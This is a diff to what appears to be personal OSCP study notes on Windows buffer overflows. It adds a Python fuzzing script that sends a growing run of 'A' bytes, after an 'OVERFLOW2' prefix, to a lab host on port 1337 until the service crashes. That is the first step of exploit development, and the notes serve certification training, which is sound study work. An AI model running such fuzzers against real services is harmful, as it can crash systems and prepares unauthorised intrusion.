@@ -10916,7 +10916,7 @@ Providers
  
 </pre>
 </div>
-<div created="20210911161500439" modified="20210911161841778" title="OSCP Style Windows Buffer Overflow">
+<div created="20210911161500439" modified="20210911162012888" title="OSCP Style Windows Buffer Overflow">
 <pre>
 Tools
 
@@ -10932,6 +10932,36 @@ Take note to rerun the exe file on every step
 ## `!mona config -set workingfolder c:\mona\%p`
 # Fuzzing
 ## Get the smallest amount of padding required to crash the thing
+## Script: &lt;div&gt;
+
+```
+import socket, time, sys
+
+ip = &quot;10.10.192.207&quot;
+
+port = 1337
+timeout = 5
+prefix = &quot;OVERFLOW2 &quot;
+
+string = prefix + &quot;A&quot; * 100
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print(&quot;Fuzzing with {} bytes&quot;.format(len(string) - len(prefix)))
+      s.send(bytes(string, &quot;latin-1&quot;))
+      s.recv(1024)
+  except:
+    print(&quot;Fuzzing crashed at {} bytes&quot;.format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * &quot;A&quot;
+  time.sleep(1)
+
+```
+&lt;/div&gt;
 # Crash Replication &amp; Controlling EIP
 ## `exploit.py`: &lt;div&gt;
 
